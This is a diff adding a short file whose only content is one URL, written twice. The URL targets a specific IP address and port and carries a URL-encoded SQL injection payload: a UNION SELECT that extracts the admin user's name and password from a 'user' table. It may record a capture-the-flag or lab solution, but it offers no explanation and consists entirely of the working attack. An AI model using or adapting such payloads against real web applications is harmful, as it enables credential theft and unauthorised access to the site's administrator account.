@@ -1,0 +1,3 @@
+http://35.196.136.210:8001/?article=1%27%20UNION%20SELECT%20name,%20password%20FROM%20user%20WHERE%20name%20=%20%27admin
+
+http://35.196.136.210:8001/?article=1%27%20UNION%20SELECT%20name,%20password%20FROM%20user%20WHERE%20name%20=%20%27admin
